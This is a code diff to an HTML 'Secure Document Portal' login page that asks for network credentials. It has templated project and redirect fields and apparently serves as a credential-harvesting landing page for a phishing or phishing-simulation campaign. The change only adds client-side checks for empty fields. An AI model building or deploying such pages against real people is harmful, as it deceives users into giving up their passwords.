@@ -24,14 +24,33 @@
           <img src="emblem.png" class="emblem" width="80%">
           <h2>Secure Document Portal</h2>
           <h4>To view this document, sign in using your network username and password.</h4>
-          <input style="border:2px solid rgb(4, 14, 99);" type="text" placeholder="Username" name="username"/>
-          <input style="border:2px solid rgb(4, 14, 99);" type="password" placeholder="Password" name="password"/>
+          <input style="border:2px solid rgb(4, 14, 99);" id="user" type="text" placeholder="Username" name="username"/>
+          <input style="border:2px solid rgb(4, 14, 99);" id="pass" type="password" placeholder="Password" name="password"/>
           <input name="project" value="{PROJECT ID}" TYPE="hidden">
           <input name="redirect" value="{REDIR PAGE}" TYPE="hidden">
-          <button>login</button>
+          <button onclick="return empty()" type="submit" value="submit">login</button>
         </form>
       </div>
     </div>
 <body>
+
+  <script>
+  function empty() {
+        document.getElementById("user").style="border:2px solid rgb(4, 14, 99);";
+        document.getElementById("user").style="border:2px solid rgb(4, 14, 99);";
+        var user;
+        var pass;
+        user = document.getElementById("user").value;
+        pass = document.getElementById("pass").value;
+        if (user == "") {
+            document.getElementById("user").style="border:2px solid rgb(180, 8, 8);";
+            return false;
+        };
+        if (pass == "") {
+            document.getElementById("pass").style="border:2px solid rgb(180, 8, 8);";
+            return false;
+        };
+    }
+  </script>
 
 </html>
